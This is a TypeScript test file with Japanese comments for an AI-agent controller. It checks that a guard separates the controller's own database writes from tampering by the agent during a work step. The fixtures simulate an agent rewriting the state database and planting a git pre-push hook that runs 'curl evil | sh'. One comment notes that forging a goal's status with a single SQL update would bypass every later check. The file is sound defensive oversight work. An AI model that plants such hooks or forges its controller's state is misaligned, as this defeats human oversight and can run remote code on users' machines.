import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { type ControllerDeps, tick } from "../src/controller/index.js";
import type { Goal } from "../src/domain/goal.js";
import { CONTROLLER_STATE_DB_KEY } from "../src/domain/guard-rules.js";
import type { Store } from "../src/store/port.js";
import { openStore } from "../src/store/sqlite.js";

/**
 * controller 自身の書き込みと、外部からの改竄を、同じ指紋の差から区別する（issue #62）。
 *
 * `.goals/.state/goals.db` は `outOfSightState` が指紋で見る保護対象でありながら、
 * controller 自身の書き込み先でもある。ACT の窓——ベースラインを控えてから検査する
 * までの間——で controller は必ずこの DB に書く（`startRun` / `finishRun` と lease の
 * 延長）。SQLite は WAL なので普段その書き込みは `goals.db` の中身を動かさないが、
 * WAL が閾値を越えたコミットでは自動 checkpoint が走って中身が変わる
 * （`tests/state-db-wal-checkpoint.test.ts` が、その挙動そのものを固定している）。
 * 実際に ACT を含むティックが `ESCALATE(protected_path_touched)` で止まり、
 * 実装役の成果が publish されないまま worktree に残った。
 *
 * **ここで固定したいのは「保護を外さないまま誤検知だけを消す」ことになる。**
 * `.goals/.state/**` を保護対象から外せば誤検知は消えるが、DB を直接書き換えて
 * 状態を偽造されても関門が鳴らなくなる。落とす条件は「保護対象かどうか」ではなく
 * 「その差分が controller 自身の書き込みで説明できるか」で、説明が付くのは
 * 自分の書き込みの前後で控えた指紋の連鎖が1度も切れていないときだけになる。
 */

const NOW = new Date("2026-08-12T08:00:00.000Z");
const WORKTREE_ROOT = "/tmp/entelecheia/worktrees";

/** 状態 DB の「中身」を模す値。実装は sha256 を返すが、ここでは区別が付けば足りる */
const CONTROLLER_WROTE = "controller が書いた形";
const TAMPERED = "誰かに書き換えられた形";

function goalWith(): Goal {
  return {
    version: 1,
    goal: {
      id: "sample-goal",
      name: "サンプル",
      desired_state: "何かが完成している",
      depends_on: [],
    },
    repository: {
      provider: "github",
      owner: "slashkiko",
      name: "entelecheia",
      default_branch: "main",
    },
    setup: [],
    acceptance_criteria: [
      {
        id: "ac-1",
        description: "テストが通る",
        verification: { type: "command", run: "mise run test" },
      },
    ],
    context: { background: "背景", constraints: [], references: [] },
    // 下限（`PROTECTED_PATH_FLOOR`）はスキーマが混ぜるが、ここは Goal を直に
    // 組み立てているので、この2本は明示で置く。
    policies: {
      require_human_approval: ["merge"],
      protected_paths: [".goals/.state/**", ".git/**"],
    },
    budget: {
      max_actor_runs: 10,
      max_reconciles: 20,
      max_wall_clock: "2h",
      max_consecutive_failures: 3,
      max_unchanged_reconciles: 9,
    },
  };
}

/**
 * 状態 DB の中身を持つ模型。
 *
 * `outOfSightState` は呼ばれた時点の値を返すだけにする。「何回目の呼び出しか」で
 * 値を変える書き方にすると、実装が指紋を取る回数にテストが縛られる。ここで
 * 見たいのは回数ではなく、**誰が書いたタイミングで変わったか**になる。
 */
interface StateFile {
  /** いまの中身 */
  content: string;
  /** `outOfSightState` を落とす */
  broken: boolean;
  /** ポートが `outOfSightState` を持たない実装かどうか */
  absent: boolean;
}

interface Fixture {
  /** ACT のあいだ（controller の書き込みとは無関係に）DB を書き換える */
  tamperDuringAct?: boolean;
  /** controller 自身の書き込みで DB の中身が変わる（WAL の checkpoint を模す） */
  checkpointOnControllerWrite?: boolean;
  /** `.git/hooks/pre-push` を ACT のあいだに置く */
  tamperHook?: boolean;
  state: StateFile;
}

function deps(store: Store, fixture: Fixture): ControllerDeps {
  const state = fixture.state;
  const hooks = { content: "元の hook" };

  /**
   * controller 自身の書き込み。WAL の自動 checkpoint に当たったティックを模して、
   * 書くたびに `goals.db` の中身が変わる形にする。
   */
  const controllerWrote = (): void => {
    if (fixture.checkpointOnControllerWrite === true) {
      state.content = `${CONTROLLER_WROTE}:${state.content}`;
    }
  };

  const wrapped: Store = {
    ...store,
    startRun: (goalId, intent) => {
      const id = store.startRun(goalId, intent);
      controllerWrote();
      return id;
    },
    finishRun: (runId, outcome) => {
      store.finishRun(runId, outcome);
      controllerWrote();
    },
    acquireLease: (goalId, owner, until, now) => {
      const got = store.acquireLease(goalId, owner, until, now);
      controllerWrote();
      return got;
    },
  };

  return {
    store: wrapped,
    owner: "worker-a",
    leaseSeconds: 300,
    worktreeRoot: WORKTREE_ROOT,
    review: { latest: async () => null },
    code: {
      getPullRequest: async () => null,
      getLatestCiRun: async () => null,
      getIssue: async () => null,
    },
    local: {
      snapshot: async () => ({ branch: "main", headSha: "a".repeat(40), dirty: false }),
    },
    command: { run: async () => ({ exitCode: 1, stdout: "", stderr: "" }) },
    approval: { getApproval: async () => null },
    worktree: {
      ensure: async (name) => ({
        path: `${WORKTREE_ROOT}/${name}`,
        branch: `entelecheia/${name}`,
      }),
      commit: async () => true,
      changedPaths: async () => [],
      repoDirtyState: async () => new Map(),
      ...(state.absent
        ? {}
        : {
            outOfSightState: async () => {
              if (state.broken) {
                throw new Error("状態 DB を読めない");
              }
              return new Map([
                [CONTROLLER_STATE_DB_KEY, state.content],
                [".git/hooks/pre-push", hooks.content],
              ]);
            },
          }),
    },
    actor: {
      kind: "claude-code",
      run: async () => {
        // ACT のあいだの書き換え。controller の書き込みとは別のタイミングで起きる。
        if (fixture.tamperDuringAct === true) {
          state.content = TAMPERED;
        }
        if (fixture.tamperHook === true) {
          hooks.content = "curl evil | sh";
        }
        return { exitCode: 0, logRef: "log", tokens: 10, artifacts: [] };
      },
    },
    writer: {
      findPullRequest: async () => null,
      createPullRequest: async () => 1,
      addComment: async () => {},
    },
    branch: {
      push: async (name) => ({ branch: `entelecheia/${name}`, pushed: true }),
    },
    llm: {
      chooseAction: async () => ({ type: "ACT", intent: "テストを直す" }),
    },
    now: () => NOW,
  };
}

describe("controller 自身の書き込みと外部からの改竄を分ける", () => {
  let store: Store;

  beforeEach(() => {
    store = openStore(":memory:");
  });

  afterEach(() => {
    store.close();
  });

  const runTick = async (fixture: Omit<Fixture, "state"> & { state?: Partial<StateFile> }) => {
    const goal = goalWith();
    store.upsertGoal(goal);
    store.setStatus(goal.goal.id, "ACTIVE", null, NOW.toISOString());
    const state: StateFile = {
      content: "ACT 前の形",
      broken: false,
      absent: false,
      ...fixture.state,
    };
    return tick(goal, deps(store, { ...fixture, state }));
  };

  it("controller 自身の書き込みで goals.db が変わっても止めない", async () => {
    // issue #62 の症状そのもの。ACT の窓の中で startRun / finishRun / lease の
    // 延長が走り、WAL の checkpoint に当たった回だけ中身が変わる。
    const result = await runTick({ checkpointOnControllerWrite: true });

    expect(result.decision?.action).toMatchObject({ type: "ACT" });
    expect(result.status).toBe("ACTIVE");
  });

  it("ACT 中に外から goals.db を書き換えられたら止める", async () => {
    // 保護そのものは残す。ここが鳴らなくなると、`UPDATE goals SET status='COMPLETED'`
    // の1行で以降の全ティックを短絡させられる。
    const result = await runTick({ tamperDuringAct: true });

    expect(result.decision?.action).toEqual({
      type: "ESCALATE",
      reason: "protected_path_touched",
    });
    expect(result.decision?.decidedBy).toBe("guard");
    expect(result.decision?.rationale).toContain(CONTROLLER_STATE_DB_KEY);
  });

  it("改竄のあとに controller が書いても、改竄は説明されない", async () => {
    // ここが案2を素朴に採った実装との分かれ目になる。「最後の書き込みの直後に
    // ベースラインを取り直す」だけだと、その前に起きた改竄が控えに畳み込まれて
    // 説明が付いてしまう。自分が書く**直前**にも指紋を見て、控えと違えば
    // そのティックのあいだ説明をやめる。
    //
    // この fixture では ACT の途中で改竄が入り、そのあとに finishRun が走って
    // もう一度中身が変わる。検査時の指紋は controller が最後に残した形と
    // 一致するので、直前の確認が無ければ素通りする。
    const result = await runTick({ tamperDuringAct: true, checkpointOnControllerWrite: true });

    expect(result.decision?.action).toEqual({
      type: "ESCALATE",
      reason: "protected_path_touched",
    });
  });

  it("状態 DB を読めないティックは、これまでどおり guard_unavailable で止まる", async () => {
    // 「確かめられなかった」を「自分が書いた」と読まない（design.md §3.1）。
    // 説明が付く経路を足したせいで、読めないことが素通りするようになっては
    // いけない。指紋を取れなかった回は控えにも使わない（`stateWitness`）。
    const result = await runTick({
      checkpointOnControllerWrite: true,
      state: { broken: true },
    });

    expect(result.decision?.action).toMatchObject({ reason: "guard_unavailable" });
  });

  it("状態 DB 以外のキーは controller の書き込みとして説明しない", async () => {
    // 説明の対象は名指しの1本だけ（`writtenByController`）。hooks は
    // controller が書く場所ではないので、変わったらそのまま違反になる。
    const result = await runTick({ tamperHook: true, checkpointOnControllerWrite: true });

    expect(result.decision?.action).toEqual({
      type: "ESCALATE",
      reason: "protected_path_touched",
    });
    expect(result.decision?.rationale).toContain(".git/hooks/pre-push");
  });

  it("outOfSightState を持たない実装でも、これまでどおり回る", async () => {
    // 持っていないことを違反にはしない（`observedRepoState`）。
    const result = await runTick({
      checkpointOnControllerWrite: true,
      state: { absent: true },
    });

    expect(result.decision?.action).toMatchObject({ type: "ACT" });
  });
});
